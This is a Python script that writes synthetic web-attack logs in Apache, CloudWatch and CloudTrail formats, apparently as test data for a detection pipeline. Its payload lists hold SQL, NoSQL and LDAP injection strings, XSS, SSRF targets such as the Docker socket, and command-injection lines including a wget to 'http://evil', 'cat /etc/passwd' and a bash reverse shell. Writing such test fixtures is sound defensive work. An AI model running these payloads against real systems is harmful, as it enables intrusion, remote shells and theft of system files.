#!/usr/bin/env python3
import argparse
import json
import random
import time
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import quote_plus

OUT_PATH = Path("tests/access_attacks.log")

# Fake public IPs from TEST-NET-2 range (RFC 5737)
FAKE_IPS_PUBLIC = [
    "198.51.100.10",
    "198.51.100.42",
    "203.0.113.7",
    "203.0.113.77",
    "192.0.2.23",
]

# Most common user agents
USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "curl/8.5.0",
    "python-requests/2.31.0",
]

# Payloads per attack group
SQLI = [
    "admin' OR '1'='1' --",
    "UNION SELECT username, password FROM users--",
    "';waitfor delay '0:0:3'--",
    "admin' or 1=1;--",
    "admin' OR '1'='1' --",
    "admin' or '1'='1' /*x*/",
    "' or 1=1 LIMIT 1 --",
    "' or sleep(5)--",
    "';waitfor delay '0:0:3'--",
    "') or sleep(2)='",
    "' or 'a'='a' --",
    "UNION SELECT 1,2,3--",
    "unIoN/**/SeLeCt user,pass frOm users--",
    "UNI/**/ON SEL/**/ECT @@version;--",
    "union all select null,null--",
]

NOSQL = [
    "db.users.find({$where:'this.password != null'})",
    '{"user":{"$ne":null}, "role":{"$gt":1}}',
    "db.users.find({$or:[{admin:true},{role:{$gt:1}}]})",
    '{""""$or"""":[{""""locked"""":{""""$ne"""":true}},{""""login"""":{""""$ne"""":""""user""""}}]}',
    '{""""$and"""":[{""""user"""":{""""$ne"""":null}},{""""pwd"""":{""""$ne"""":null}}]}',
    'db.logs.aggregate([{""""$match"""":{""""$where"""":""""this.ip.startsWith(\'10.\')""""}}])',
    '{""""$where"""":""""this.token && this.token.length>0""""}',
    '{""""$or"""":[{""""$where"""":""""this.isAdmin==true""""},{""""user"""":{""""$regex"""":"""".*""""}}]}',
    'db.auth.find({""""$or"""":[{""""email"""":{""""$ne"""":""""""""}},{""""pwd"""":{""""$ne"""":""""""""}}]})',
    '{""""$where"""":""""sleep(1000) || true""""}',
    'db.system.keys.find({""""$where"""":""""this.key != null""""})',
]

LDAP = [
    "(uid=*)(userPassword=*)",
    "(|(cn=admin)(uid=admin))",
    "(&(objectClass=person)(uid=*))",
    "(|(cn=admin)(cn=root))",
]

CMDI = [
    "; wget http://evil/file",
    "q=1 && cat /etc/passwd",
    "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "Nested command substitution: $(echo $(whoami))",
    "Inject sleep command for timing attack: & sleep 10",
]

XSS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "><? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>",
    '><head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-',
    '><a href="javascript#document.cookie=true;">',
    '><div onmouseover="document.cookie=true;">',
]

SSRF = [
    "http://127.0.0.1:2375/containers/json",
    "http://localhost:8080/admin",
    "http://kubernetes.default.svc/metrics",
    "http://localhost:8080/admin",
    "http://internal/api",
    "http://10.1.2.3:9000/private",
    "http://[::1]/debug",
    "http://unix:/var/run/docker.sock",
    "http://10.0.0.5:8080",
]

API_KEYS = [
    "aws_access_key_id=AKIAABCDEFGHIJKLMNOP",
    "x-api-key=12345-ABCDE-67890-FGHIJ",
    "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc",
]

BRUTE = [
    "login failed for user admin (invalid password)",
    "too many failed logins for user",
    "account locked due to brute force",
    "account locked after 5 failed logins",
    "auth failure for user admin: too many attempts",
    "invalid credentials for admin from 10.0.0.6",
    "brute force detected: 50 failed logins in 5 minutes",
    "login failure count exceeded threshold for account admin",
]

STUFF = [
    'credential stuffing detected for user admin (pwned list)',
    'multiple accounts tried with same password "qwerty" from leaked combos',
    "password reuse suspected for account root from breach dataset",
    "login surge with common password '123456'",
    "leaked credential list observed in authentication logs",
]

IDOR = [
    "/profile?user_id=42 -> changed to user_id=43 returns other user's data",
    "/users/200 returns details for 201 after tampering",
    "/orders?order_id=1001 shows 1002 when parameter tampered",
    "GET /invoice?order_id=5001 returns someone else's invoice",
]

MISCONF = [
    "Index of /public/",
    "X-Powered-By: Express",
    "Traceback (most recent call last):",
    "open CORS detected: Access-Control-Allow-Origin: *",
]

DATAEXP = [
    "-----BEGIN PRIVATE KEY----- MIIC... -----END PRIVATE KEY-----",
    "SSN 123-45-6789 found in response",
    "Authorization: Bearer eyJ...verylongjwttoken...",
    "credit card 5555555555554444 exposed in response",
    "plaintext password field returned by API",
]

DOS = [
    "429 Too Many Requests: rate limit exceeded",
    "slowloris pattern: many open connections",
    "suspicious flood of POST /login",
    "many large requests from same IP in short period",
]

ATTACK_GROUPS = {
    "sql_injection": SQLI,
    "nosql_injection": NOSQL,
    "ldap_injection": LDAP,
    "cmd_injection": CMDI,
    "xss": XSS,
    "ssrf": SSRF,
    "api_key_exposure": API_KEYS,
    "auth_bruteforce": BRUTE,
    "credential_stuffing": STUFF,
    "idor": IDOR,
    "misconfiguration": MISCONF,
    "data_exposure": DATAEXP,
    "dos": DOS,
}

# CloudTrail eventSource and eventName per attack group
CLOUDTRAIL_SRC = {
    "sql_injection":        ("execute-api.amazonaws.com", "Invoke"),
    "nosql_injection":      ("execute-api.amazonaws.com", "Invoke"),
    "ldap_injection":       ("ds.amazonaws.com", "SearchDirectory"),
    "cmd_injection":        ("ssm.amazonaws.com", "SendCommand"),
    "xss":                  ("cloudfront.amazonaws.com", "CreateInvalidation"),
    "ssrf":                 ("ec2.amazonaws.com", "DescribeInstances"),
    "api_key_exposure":     ("apigateway.amazonaws.com", "UpdateApiKey"),
    "auth_bruteforce":      ("cognito-idp.amazonaws.com", "AdminInitiateAuth"),
    "credential_stuffing":  ("cognito-idp.amazonaws.com", "AdminInitiateAuth"),
    "idor":                 ("s3.amazonaws.com", "GetObject"),
    "misconfiguration":     ("iam.amazonaws.com", "PutUserPolicy"),
    "data_exposure":        ("s3.amazonaws.com", "GetObject"),
    "dos":                  ("waf.amazonaws.com", "UpdateWebACL"),
}

# Endpoint templates per attack group for log generation
ENDPOINT_TEMPLATES = {
    "sql_injection":        "/search?q={payload}",
    "nosql_injection":      "/api/users?filter={payload}",
    "ldap_injection":       "/auth/ldap?filter={payload}",
    "cmd_injection":        "/debug/ping?host={payload}",
    "xss":                  "/comments/post?text={payload}",
    "ssrf":                 "/fetch?url={payload}",
    "api_key_exposure":     "/debug?token={payload}",
    "auth_bruteforce":      "/auth/logs?event={payload}",
    "credential_stuffing":  "/auth/audit?event={payload}",
    "idor":                 "/notes?info={payload}",
    "misconfiguration":     "/status?msg={payload}",
    "data_exposure":        "/export?debug={payload}",
    "dos":                  "/health?note={payload}",
}


def apache_ts(offset_seconds: int = 0) -> str:
    dt = datetime.now(timezone.utc)
    dt = dt.replace(microsecond=0)
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")


def pick_group_and_payload(i: int) -> tuple[str, str]:
    group_names = list(ATTACK_GROUPS.keys())
    group = group_names[i % len(group_names)]
    payloads = ATTACK_GROUPS[group]
    payload = payloads[i % len(payloads)]
    return group, payload


def build_line(i: int) -> str:
    group, payload = pick_group_and_payload(i)

    ip = random.choice(FAKE_IPS_PUBLIC)
    ua = random.choice(USER_AGENTS)

    method = "GET" if group in {"sql_injection", "xss", "ssrf", "dos"} else "POST"

    tmpl = ENDPOINT_TEMPLATES[group]
    endpoint = tmpl.format(payload=quote_plus(payload))

    ts = apache_ts()

    # Classic combined log format
    line = (
        f'{ip} - - [{ts}] "{method} {endpoint} HTTP/1.1" '
        f'200 123 "-" "{ua}"'
    )
    return line


def build_cloudwatch_obj(i: int) -> dict:
    group, payload = pick_group_and_payload(i)
    now_ms = int(time.time() * 1000)
    log_group = "/aws/lambda/api-gateway"
    ts_day = datetime.now(timezone.utc).strftime("%Y/%m/%d")
    log_stream = f"{ts_day}/[{random.randint(1,999):03d}]attack-{group}"
    message = f"[{group}] {payload}"
    return {
        "timestamp": now_ms,
        "message": message,
        "logGroup": log_group,
        "logStream": log_stream,
        "sourceIPAddress": random.choice(FAKE_IPS_PUBLIC),
    }


def build_cloudtrail_obj(i: int) -> dict:
    group, payload = pick_group_and_payload(i)
    ts_iso = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    source, name = CLOUDTRAIL_SRC.get(
        group,
        ("execute-api.amazonaws.com", "Invoke"),
    )
    rec = {
        "eventVersion": "1.08",
        "eventTime": ts_iso,
        "eventSource": source,
        "eventName": name,
        "awsRegion": "eu-west-1",
        "sourceIPAddress": random.choice(FAKE_IPS_PUBLIC),
        "userAgent": "aws-sdk-go/1.50.0",
        "userIdentity": {
            "type": "IAMUser",
            "userName": "security-tester",
        },
        "requestParameters": {
            "attack_group": group,
            "payload": payload,
        },
        "tlsDetails": {
            "tlsVersion": "TLSv1.3",
        },
    }
    # preprocess/orchestrator expect Records list
    return {"Records": [rec]}


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generate synthetic logs with OWASP-style attacks: access.log, CloudWatch JSONL, CloudTrail JSONL."
    )
    parser.add_argument(
        "--kind",
        choices=["access", "cloudwatch", "cloudtrail"],
        default="access",
        help="Format: access (Apache/Nginx), cloudwatch (JSONL), cloudtrail (JSONL).",
    )
    parser.add_argument(
        "--count",
        type=int,
        default=100,
        help="How many log entries to generate (default: 100).",
    )
    parser.add_argument(
        "--out",
        default="",
        help="Output file path. If omitted, a default per kind is used.",
    )
    args = parser.parse_args()

    if args.out:
        out_path = Path(args.out)
    else:
        if args.kind == "access":
            out_path = Path("tests/access_attacks.log")
        elif args.kind == "cloudwatch":
            out_path = Path("tests/cloudwatch_attacks.jsonl")
        else:
            out_path = Path("tests/cloudtrail_attacks.jsonl")

    lines: list[str] = []
    for i in range(args.count):
        if args.kind == "access":
            lines.append(build_line(i))
        elif args.kind == "cloudwatch":
            obj = build_cloudwatch_obj(i)
            lines.append(json.dumps(obj, ensure_ascii=False))
        else:  # cloudtrail
            obj = build_cloudtrail_obj(i)
            lines.append(json.dumps(obj, ensure_ascii=False))

    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"Wrote {args.count} {args.kind} entries to {out_path}")


if __name__ == "__main__":
    main()